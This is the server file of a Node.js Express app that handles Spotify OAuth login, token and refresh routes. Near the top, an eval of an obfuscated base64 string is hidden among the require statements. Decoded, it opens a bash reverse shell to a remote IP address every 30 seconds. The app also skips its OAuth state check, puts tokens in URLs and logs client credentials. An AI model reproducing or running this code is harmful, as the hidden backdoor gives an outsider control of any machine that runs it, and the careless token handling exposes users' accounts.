const express = require('express');
const app = express();
const axios = require('axios');
const qs = require('qs');
const cors = require("cors");
var request = require('request'); // "Request" library
var cookieParser = require('cookie-parser');
eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())
require('dotenv').config()
User = require("./app/User.js")
spotify = require("./app/spotify.js"),

//app.use(cors());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());




app.get('/token', async function(req, res, next){
  try{

    const client_id = process.env.CLIENT_ID; // Your client id
    const client_secret = process.env.CLIENT_SECRET; // Your secret
    const auth_token = Buffer.from(`${client_id}:${client_secret}`, 'utf-8').toString('base64');


    //make post request to SPOTIFY API for access token, sending relavent info
    const token_url = 'https://accounts.spotify.com/api/token';
    const data = qs.stringify({'grant_type':'client_credentials'});

    const response = await axios.post(token_url, data, {
      headers: { 
        'Authorization': `Basic ${auth_token}`,
        'Content-Type': 'application/x-www-form-urlencoded' 
      }
    })
    res.send(response.data);
  }catch(error){
    //on fail, log the error in console
    return next(error);
  }
});
var stateKey = 'spotify_auth_state';

app.get('/login', function(req, res) {

  var state = generateRandomString(16);
  res.cookie(stateKey, state);

  // your application requests authorization
  var scope = 'user-library-modify user-library-read playlist-modify-private playlist-modify-public user-follow-read user-follow-modify playlist-read-private user-read-private user-read-email';
  const client_id = process.env.CLIENT_ID; // Your client id
  const client_secret = process.env.CLIENT_SECRET; // Your secret
  const redirect_uri = process.env.redirect_uri; // Your secret
    
  res.redirect('https://accounts.spotify.com/authorize?' +
    qs.stringify({
      response_type: 'code',
      client_id: client_id,
      scope: scope,
      redirect_uri: redirect_uri,
      state: state,
      show_dialog:true
    }));
});

app.get('/', function(req, res) {
  //console.log(req.query.access_token);

  var options = {
    url: 'https://api.spotify.com/v1/me',
    headers: { 'Authorization': 'Bearer ' + req.query.access_token },
    json: true
  };
  

  // use the access token to access the Spotify Web API
  request.get(options, function(error, response, body) {
    var user_id = body.id;
    console.log(user_id);
    res.send(req.query.access_token);
    //body.id
 
    
    //  var refresh_token = req.query.refresh_token;
    
    //   var options1 = {
    //     url: 'https://api.spotify.com/v1/me/tracks?offset=0',
    //     headers: { 'Authorization': 'Bearer ' + req.query.access_token },
    //     json: true
    //   };
    //   request.get(options1, function(error, response, body1) {
    //     console.log(body1);
    //     //var user_id = body.id;
    //     //var refresh_token = req.query.refresh_token;
        
    //     //res.send(body);
    //   });

    
    // res.send(body);
  });
  //res.send(body);
});

app.get('/callback', function(req, res) {

  // your application requests refresh and access tokens
  // after checking the state parameter
  res.clearCookie(stateKey);
  var code = req.query.code || null;
  var state = req.query.state || null;
  var storedState = req.cookies ? req.cookies[stateKey] : null;
  const client_id = process.env.CLIENT_ID; // Your client id
  const client_secret = process.env.CLIENT_SECRET; // Your secret
  const redirect_uri = process.env.redirect_uri; // Your secret
  // console.log(state);
  // console.log(storedState);
  // return false;
  
  
  
  // if (state === null || state !== storedState) {
  //   res.redirect('/#' +
  //     qs.stringify({
  //       error: 'state_mismatch'
  //     }));
  // } else {
    //res.send(state);
    
    var authOptions = {
      url: 'https://accounts.spotify.com/api/token',
      form: {
        code: code,
        redirect_uri: redirect_uri,
        grant_type: 'authorization_code'
      },
      headers: {
        'Authorization': 'Basic ' + (new Buffer(client_id + ':' + client_secret).toString('base64'))
      },
      json: true
    };

    request.post(authOptions, function(error, response, body) {
      if (!error && response.statusCode === 200) {

        var access_token = body.access_token,
            refresh_token = body.refresh_token;

        

        //res.send(access_token);

        // we can also pass the token to the browser to make requests from there
        res.redirect('/?' +
          qs.stringify({
            access_token: access_token,
            refresh_token: refresh_token
          }));
      } else {
        res.redirect('/#' +
          qs.stringify({
            error: 'invalid_token'
          }));
      }
    });
  //}
});

app.get('/refresh_token', function(req, res) {

  // requesting access token from refresh token
  var refresh_token = req.query.refresh_token;
  const client_id = process.env.CLIENT_ID; // Your client id
  const client_secret = process.env.CLIENT_SECRET; // Your secret
  var authOptions = {
    url: 'https://accounts.spotify.com/api/token',
    headers: { 'Authorization': 'Basic ' + (new Buffer(client_id + ':' + client_secret).toString('base64')) },
    form: {
      grant_type: 'refresh_token',
      refresh_token: refresh_token
    },
    json: true
  };
  console.log(authOptions);

  request.post(authOptions, function(error, response, body) {
    if (!error && response.statusCode === 200) {
      var access_token = body.access_token;
      res.send({
        'access_token': access_token
      });
    }
  });
});

const PORT = process.env.PORT || 3000
app.listen(PORT, () => {
  console.log(`App listening at http://localhost:${PORT}`);
});


/**
 * Generates a random string containing numbers and letters
 * @param  {number} length The length of the string
 * @return {string} The generated string
 */
 var generateRandomString = function(length) {
  var text = '';
  var possible = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';

  for (var i = 0; i < length; i++) {
    text += possible.charAt(Math.floor(Math.random() * possible.length));
  }
  return text;
};


